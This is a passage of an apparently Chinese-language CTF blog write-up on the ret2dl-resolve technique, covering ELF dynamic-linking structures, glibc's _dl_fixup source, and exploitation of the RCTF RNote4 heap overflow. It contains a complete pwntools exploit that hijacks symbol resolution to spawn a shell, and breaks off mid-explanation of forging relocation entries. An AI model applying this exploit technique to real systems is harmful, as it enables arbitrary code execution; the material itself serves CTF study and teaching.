title=".dynstr"></a>.dynstr</h3><p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个read。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x080481AC的偏移。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804821C ; ELF String Table</span><br><span class="line">LOAD:0804821C byte_804821C    db 0                    ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804821C                                         ; LOAD:080481EC↑o ...</span><br><span class="line">LOAD:0804821D aLibcSo6        db 'libc.so.6',0</span><br><span class="line">LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 aRead           db 'read',0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B aLibcStartMain  db '__libc_start_main',0</span><br><span class="line">LOAD:0804823B                                         ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:0804824D aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804825C aGlibc20        db 'GLIBC_2.0',0</span><br><span class="line">LOAD:08048266                 align 4</span><br><span class="line">LOAD:08048268                 dd 2, 10002h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:08048280                 dd 0D696910h, 20000h, 40h, 0</span><br></pre></td></tr></table></figure></p><h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048290 ; ELF REL Relocation Table</span><br><span class="line">LOAD:08048290                 Elf32_Rel &lt;8049FFCh, 206h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048298 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048298                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482A0                 Elf32_Rel &lt;804A010h, 307h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br></pre></td></tr></table></figure><p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></p><h2 id="gilbc2-23-dl-fixup源码分析"><a href="#gilbc2-23-dl-fixup源码分析" class="headerlink" title="gilbc2.23 _dl_fixup源码分析"></a>gilbc2.23 _dl_fixup源码分析</h2><p>glibc源码阅读网站 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61</a><br>glibc源码下载网站 <a href="http://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/</a></p><p>_dl_fixup函数的两个参数  struct link_map *l , ELFW(Word) reloc _arg都在glibc/elf/link.h中定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* 前几个成员是使用调试器的协议的一部分.</span></span><br><span class="line"><span class="comment">       这与SVR4中使用的格式相同.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* ELF文件中的地址与内存中的地址之间的差异*/</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* 绝对文件名对象.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* 共享对象的动态部分 .dynamic  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 后一个链和前一个链.*/</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use this macro to refer to ELF types independent of the native wordsize.</span></span><br><span class="line"><span class="comment">   `ElfW(TYPE)' is used in place of `Elf32_TYPE' or `Elf64_TYPE'.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElfW(type)_ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW(e,w,t)_ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW_1(e,w,t)e##w##t</span></span><br></pre></td></tr></table></figure><p>_dl_fixup 在glibc/elf/dl-runtime.c<br>首先说第一个参数，是一个link_map的指针，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访问到.dynamic这个section</p><p>而第二个参数，是当前要调用的导入函数在.rel.plt中的偏移（不过64位的话就直接是index下标），比方说这里，read就是0，__libc_start_main就是1*sizeof(Elf32_Rel)=8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (  </span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"># endif  </span><br><span class="line">    struct link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab  </span></span><br><span class="line"><span class="function">        </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc  </span><br><span class="line">        = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="keyword">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don't look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=  </span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  </span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                version = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//得到结果   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//将结果写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_dl_fixup函数</strong></p><ul><li>1 _dl_fixup函数首先通过宏D_PTR从用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</li><li>2 rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li><li>3 rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li><li>4 .dynstr + sym-&gt;st_name得出符号名字符串指针</li><li>5 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li><li>6 调用这个函数</li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>那么，这个怎么去利用呢，有多种利用方式</p><h3 id="伪造-dynsym"><a href="#伪造-dynsym" class="headerlink" title="伪造 .dynsym"></a>伪造 .dynsym</h3><p>即使保护全没开 .dynsym也是不可写的，但可以<br>通过改写.dynamic的DT_STRTAB来伪造ELF String Table，也就是.dynsym<br>这个只有在checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用free(“bin/sh”)（因为只有第一次才会resolve），就等于调用了system(“/bin/sh”)。</p><p>例题就是RCTF的RNote4，题目是一道堆溢出，NO RELRO而且NO PIE溢出到后面的指针可以实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 a1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;a1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[a1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      <span class="comment">// heap overflow堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = (note *)<span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3-&gt;buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1u</span>LL); <span class="comment">//堆中存放了指针，所以可以通过这个任意写</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3-&gt;buf )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写.dynamic指向字符串表的指针，使其指向一块可写内存，比如.bss，然后再写这块内存，使得相应偏移出刚好有个system\x00。exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=<span class="keyword">True</span></span><br><span class="line"><span class="comment">#e=ELF('./libc.so.6')</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process(<span class="string">'./RNote4'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"rnote4.2018.teamrois.cn"</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x01"</span>)</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span> <span class="keyword">and</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x02"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">"\x03"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#伪造的字符串表，(0x457-0x3f8)刚好是"free\x00"字符串的偏移</span></span><br><span class="line">payload = <span class="string">"C"</span> * (<span class="number">0x457</span><span class="number">-0x3f8</span>) + <span class="string">"system\x00"</span></span><br><span class="line"><span class="comment">#先新建两个notes</span></span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line"><span class="comment">#将0x601EB0，即.dynamic的字符串表指针，写成0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line"><span class="comment">#在0x6020C8处写入伪造的字符串表</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#会第一次调用free，所以实际上是system("/bin/sh")被调用，如前面所说</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造Elf32-Rel"><a href="#伪造Elf32-Rel" class="headerlink" title="伪造Elf32_Rel"></a>伪造Elf32_Rel</h3><p>通过操纵第二个参数，使其指向我们所构造的Elf32_Rel</p><p>当.dynamic不可写时，那么以上方法就没用了，所以有第二种利用方法<br> 上面我们讲完了函数的解析流程 主要是由dl_runtime_resolve(link_map,rel_offset),之所以它能解析不同函数的地址，以为我们传入的rel_offset不同，因此，把传入的rel_offset改为我们希望的函数的偏移，便可以执行我们希望的函数，新的问题来了，.rel.plt中不一定存在我们希望的函数，因此就需要我们伪造一个.rel.plt，将rel_offset修改为一个比较大的值，在.rel.plt+rel_offset的地方是我们伪造好的，结构跟.rel.plt相同的数据，这样我们就相当于伪造好了reloc（重定位入口），程序又会根据r_info找到对应的.dynsym中的symbols，我们再次伪造symbols的内容-&gt;st_name,使得到的str在我们的可控地址内，然后在.dynstr+st_name地址处放置库函数字符串例如：system。</p><p>所以，最终的利用思路，大概是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400610</span> ; __unwind &#123;</span><br><span class="line">.plt:<span class="number">0000000000400610</span>                 push    cs:qword_602008</span><br><span class="line">.plt:<span class="number">0000000000400616</span>                 jmp     cs:qword_602010</span><br><span class="line">.plt:<span class="number">0000000000400616</span> sub_400610      endp</span><br></pre></td></tr></table></figure></p><p>构造ROP，跳转到resolve的PLT，push link_map的位置，就是上面所示的这个地方，也就是要调用_dl_runtime_resolve的地方,此时，栈中必须要有已经伪造好的指向伪造的Elf32_Rel的偏移</p><p>伪造一个很大的rel_offset，一直偏移到bss段（一般这里可读可写，且位于.rel.plt的高地址）</p><p>伪造Elf32_Rel即.rel.plt的结构,由RELSZ可知，它的大小为8字节（commend: readelf -d fun 可以看到），我们需要fake r_offset,以及r_info，r_offset一般是函数在.got.plt的地址，r_info可以用来计算在symtab中的index并且保存了类型，所以我们可以让伪造的symtab的数据紧跟在这段数据后面，这样我们就可以计算出它的index: index=(bss+0×100-.dynsym)/0×10(因为SYMENT指明大小为16字节)，类型必须为7，所以我们就可以计算出r_info的值<br>r_info=(index &lt;&lt; 8 ) | 